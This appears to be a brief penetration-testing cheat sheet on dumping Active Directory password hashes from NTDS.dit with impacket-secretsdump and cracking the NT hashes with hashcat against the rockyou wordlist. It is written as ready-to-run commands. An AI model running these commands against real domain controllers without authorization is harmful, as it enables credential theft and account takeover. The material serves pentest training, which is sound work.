# Dumping the NTDS.dit

**NTDS.dit** is a database used to store AD data. This data includes:

* User information
* Group Information
* Security descriptors
* Password hashes



{% code title="Secretsdump" %}
```bash
impacket-secretsdump DOMAIN.com/$ADMIN_USER:'$PASS'@$DC_IP -just-dc-ntlm
```
{% endcode %}



Once we did the dump, we have to copy only NT hash to a file (`ntds.txt`). This file we will use to crack the hash with `hashcat`.

<pre class="language-bash"><code class="lang-bash"><strong>hashcat -m 1000 ntds.txt /PATH/TO/rockyou.txt
</strong></code></pre>

Once tha scanning is done, we can view the results with the command bellow:

```bash
hashcat -m 1000 ntds.txt /PATH/TO/rockyou.txt --show
```
